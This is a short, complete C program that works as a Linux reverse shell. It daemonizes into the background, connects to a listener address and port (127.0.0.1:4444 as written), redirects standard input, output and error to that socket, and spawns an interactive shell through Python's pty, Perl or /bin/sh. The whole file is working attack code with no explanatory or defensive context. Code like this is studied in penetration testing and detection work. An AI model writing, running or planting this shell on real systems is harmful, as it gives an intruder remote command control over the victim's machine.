#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>

int main() {
	int fd;
	struct sockaddr_in sin;
	int lport = 4444;
	char lhost[16] = "127.0.0.1";
	daemon(1, 0); // run in background
	sin.sin_family = AF_INET;
	sin.sin_port = htons(lport);
	sin.sin_addr.s_addr = inet_addr(lhost);
	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) ;
	if ((connect(fd, (struct sockaddr *) &sin, sizeof(struct sockaddr))) < 0) {
		perror("Connect fail");
		return 0;
	}
	dup2(fd, 0);
	dup2(fd, 1);
	dup2(fd, 2);
	//try pty with python, if false:
	if (system("python -c \"import pty; pty.spawn('/bin/sh')\""))
	{
		//try pty with perl, if false:
		if (system("perl -e \'exec \"/bin/sh\";\'"))
		{
			// can not pty
			system("/bin/sh -i");
		}
	}
	close(fd);
}